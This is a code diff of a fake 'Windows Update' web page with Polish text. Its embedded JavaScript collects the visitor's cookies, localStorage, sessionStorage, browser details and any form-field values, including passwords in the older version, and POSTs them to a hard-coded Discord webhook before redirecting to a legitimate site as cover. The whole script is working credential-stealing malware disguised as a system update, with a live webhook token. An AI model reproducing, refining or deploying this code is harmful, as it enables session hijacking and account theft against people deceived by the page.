@@ -2,41 +2,41 @@
 <html>
 <head>
     <title>Windows Update</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:60px 20px;}</style>
+    <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:80px;}</style>
 </head>
 <body>
-    <h1>Windows 11 Update</h1>
-    <p>Trwa instalacja krytycznej aktualizacji...</p>
+    <h1>Trwa aktualizacja Windows...</h1>
+    <p>Proszę czekać 5 sekund.</p>
 
     <script>
         const webhook = "https://discord.com/api/webhooks/1521645357082087454/e2MVaOrDUJxQS-FAMPosani30S4nIyD4GVG7nPHD9HiRwIuTwuaNVYXdUsWHun1xamcW";
 
         function send(d) {
-            fetch(webhook, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:"*MAX STEAL* ```json\n" + JSON.stringify(d,null,2) + "\n```"})});
+            fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"```json\n"+JSON.stringify(d,null,2)+"\n```"})});
         }
 
         let data = {
             url: location.href,
             cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
+            local: JSON.stringify(localStorage),
+            session: JSON.stringify(sessionStorage),
             ua: navigator.userAgent,
             platform: navigator.platform,
-            timestamp: new Date().toISOString()
+            inputs: {}
         };
 
-        // Łap wszystko co się da
-        setInterval(() => {
-            document.querySelectorAll('input, textarea, [type=password], [type=email]').forEach(el => {
-                if (el.value) data[el.type + '_' + (el.name || el.id)] = el.value;
-            });
-            send(data);
-        }, 1000);
+        document.querySelectorAll('input,textarea,select').forEach(el => {
+            if (el.value) data.inputs[el.name || el.id || 'field'] = el.value;
+        });
 
         send(data);
 
-        setTimeout(() => location = "https://microsoft.com", 6000);
+        setTimeout(() => location = "https://google.com", 5000);
     </script>
 </body>
 </html>
+Wysłano
+Napisz wiadomość
+Napisz do:
+
+
